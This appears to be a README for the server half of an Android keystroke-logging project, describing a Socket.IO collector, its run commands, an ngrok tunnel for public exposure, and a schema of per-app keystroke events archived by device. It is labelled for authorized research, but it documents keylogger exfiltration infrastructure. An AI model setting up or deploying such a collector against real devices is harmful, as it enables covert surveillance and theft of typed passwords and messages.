# keystroker research server (sample)

Minimal **Socket.IO** collector used to test the Android client end-to-end. Authorized
research / lab use only.

## Run

```bash
cd server
npm install
AUTH_TOKEN="my-research-token" PORT=3000 npm start
```

The same `AUTH_TOKEN` must be configured in `app/build.gradle`
(`BuildConfig.AUTH_TOKEN`).

Received events are appended to `archive/<device_id>.jsonl`, one JSON object per line:

```json
{"id":12,"package_name":"com.example","app_name":"Example","event_type":"KEYSTROKE","content":"{\"op\":\"insert\",\"pos\":0,\"ins\":\"h\",\"del\":\"\",\"len\":1}","timestamp":1720000000000,"device_id":"a1b2…"}
```

## Exposing over HTTPS (for cert pinning)

The Android client speaks **wss** (secure). For local testing, expose this server over
TLS:

### Option A — ngrok (easiest)

```bash
ngrok http 3000
# -> https://abcd-1-2-3-4.ngrok-free.app
```

Set `SERVER_URL` in `app/build.gradle` to that URL. To enable cert pinning, get the
certificate fingerprint (see root README → "Cert pinning").

### Option B — mkcert (local trusted CA)

```bash
mkcert -install
mkcert localhost 127.0.0.1
# then run the server with TLS (e.g. via a small https wrapper or a reverse proxy)
```

## Endpoints

- `GET /` — health check
- Socket.IO events:
  - `log_data` (client → server): `{ device_id, auth, timestamp, event_count, events[] }`
  - `data_received` (server → client): `{ synced_ids[] }`
  - `heartbeat` (client → server): `{ device_id, auth, timestamp }`
